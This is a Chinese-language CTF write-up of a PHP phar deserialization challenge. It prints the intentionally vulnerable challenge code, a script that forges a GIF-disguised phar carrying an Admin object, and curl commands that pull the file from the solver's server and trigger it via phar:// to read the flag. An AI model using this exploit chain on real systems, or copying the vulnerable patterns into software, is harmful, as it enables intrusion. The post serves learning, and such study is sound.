---
title: '网络安全:反序列化问题'
top: false
cover: false
toc: true
mathjax: true
date: 2020-06-07 12:41:53
password:
summary:
tags:
categories:
---

( ｡ớ ₃ờ)ھ经典反序列化问题,今天遇到了一个反序列化问题，最后一步连续踩坑...着实很难受(自己太菜了)！ 
话不多说我们先来看一看题目：

```php
<?php
if (!file_exists("/var/www/data/secret")) {
   $SECRET = randomkeys(16);
   file_put_contents("/var/www/data/secret", $SECRET);
} else {
   $SECRET = file_get_contents("/var/www/data/secret");
}
if (isset($_SERVER["HTTP_X_REAL_IP"])) $SERVER_IP = $_SERVER["HTTP_X_REAL_IP"];
else $SERVER_IP = $_SERVER["REMOTE_ADDR"];
$SANDBOX = "/var/www/data/" . base64_encode("ctf" . $SERVER_IP);    // 根据 remote_addr 给每个人创建一个沙盒
@mkdir($SANDBOX);
@chdir($SANDBOX);

if (!isset($_COOKIE["session-data"])) {
   $data = serialize(new User($SANDBOX));
   $hmac = hash_hmac("sha1", $data, $SECRET);    //将每个人唯一的沙盒对象加上签名后作为 session-data
   setcookie("session-data", sprintf("%s-----%s", $data, $hmac));
}

class User {
   public $avatar;
   function __construct($path) {
       $this->avatar = $path;    //设置了头像的路径为沙盒路径
  }
}

class Admin extends User {
   function __destruct() {
       $_GET["lucky"]();
  }
}

function randomkeys($length){   
   $output='';   
   for ($a = 0; $a<$length; $a++) {   
       $output .= chr(mt_rand(0, 0xFF));    //生成php随机数   
    }   
    return $output;   
}   

function getFlag() {
   $flag = file_get_contents("/flag");
   echo $flag;
}

function check_session() {
   global $SECRET;
   $data = $_COOKIE["session-data"];
   list($data, $hmac) = explode("-----", $data, 2);
   if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) {
       die("Bye");
  }
   if (!hash_equals(hash_hmac("sha1", $data, $SECRET), $hmac)) {
       die("Bye Bye");
  }
   $data = unserialize($data);    //判断身份，如果身份正确返回头像路径(沙盒路径)
   if (!isset($data->avatar)) {    //该函数不可绕过
       die("Bye Bye Bye");
  }
   return $data->avatar;
}

function upload($path) {    //获取头像，检查头是否为GIF89a ，正确后存入沙盒
   $data = file_get_contents($_GET["url"] . "/avatar.gif");
   if (substr($data, 0, 6) !== "GIF89a") {    //这个就是利用 phar:// 进行反序列化的点
       die("Fuck off");
  }
   file_put_contents($path . "/avatar.gif", $data);
   die("Upload OK");
}

function show($path) {    //获取这个沙盒中的头像
   if (!file_exists($path . "/avatar.gif")) {
       $path = "/var/www/html";
  }
   header("Content-Type: image/gif");
   die(file_get_contents($path . "/avatar.gif"));
}

$mode = $_GET["m"];
if ($mode == "upload") {
   upload(check_session());
} else if ($mode == "show") {
   show(check_session());
} else {
   highlight_file(__FILE__);
}
```

## 简述

这道题是根据经典题目进行的改编，进行了简化，关键位置已经加上了注释。原题目为Orange 在 2017 年 hitcon 上面出的利用 Phar 进行反序列化。
题目很简短，接下来就让我们一起分析一下这道题。
题目简析

这是一个反序列化的题目。但是当年这道题全球0解，原因是用户认证部分不可以绕过，如果我们想要利用unserailize()，通过控制参数去实现反序列化，必须先绕过cookie检验。
但是cookie是通过remote_addr配合sha1进行hmac签名生成的，几乎不可能绕过，当时做题的人统统沉迷于此，才最终全球0解。
另辟蹊径

## 利用思路

我们使用 Phar 反序列化的条件有三点
(1)文件上传点
(2)系统文件函数
(3) phar:// 伪协议

可以看到 upload 函数，完美契合我们的要求，我们此时只要精心构造一个包含Admin对象和avatar.gif文件，并且起始为 GIF89a 的phar文件传上去，下一次通过Phar://协议让file_get_contents 请求这个文件就可以实现我们对 Admin 对象的反序列化了！

程序示例：
```php
<?php
class Admin {
   public $avatar = 'orz';  
} 
$p = new Phar(__DIR__ . '/avatar.phar', 0);
$p['file.php'] = '<?php ?>';
$p->setMetadata(new Admin());
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
rename(__DIR__ . '/avatar.phar', __DIR__ . '/avatar.gif');
?>
```

解题过程

```shell
curl http://hostname --cookie-jar cookie
返回 ： ... 无关紧要
curl -b cookie 'http://hostname?m=upload&url=http://你的服务器host'
返回：Upload OK%
curl -b cookie 'http://hostname?m=upload&url=phar:///var/www/data/（ctf + 本地IP）base64编码&lucky=getFlag
```

返回：flag
即可解出～！！(*･ω･)

## 题目回顾

在2020年做这种题目网上题解一艘一堆，直接初步定位题目类型简简单单，但是具体一些细节也会让你很难直接做对
首先这道题是base64不是md5，有的人看完原题直接就用md5，老老实实看题还是有必要的
此外这道题没有用到匿名函数，省去了写脚本的步骤，降低了难度
太久没看php最近都在看Go，看见'ctf' . 'ip' 以为是一个类或者结构体的属性....(是拼接啊喂！基础啊老哥！！！)
最后（ctf + 本地IP）base64 直接在浏览器，Brupsuite，POSTMAN都可以很明确的获取到，这里也是本人实力眼瞎没有看到...其实！！！题目里明明写了是ctf和IP拼接！！！啊啊啊！！这个错误耗时3小时，最后还是交流了一下才发现没加....一个刻骨铭心的错误Otz
这道题每个用户可以彼此空间隔离，不会出现一个上传，全体白嫖的现象，妙啊

## 尾言

遇到自己一小时解决不了的问题还是交流一下比较好，没有交流很容易自闭hhh
最后BiliBili贴代码怎么自动高光，需要后续研究一下=。=手动变色太麻烦了
有哪里想交流随时留言！！感觉安全方面学习交流还是比没有代码那么方便，欢迎交流啊～

## 参考文献

如果想要深入学习反序列化，为各位推荐一个大大大佬的博文
https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面

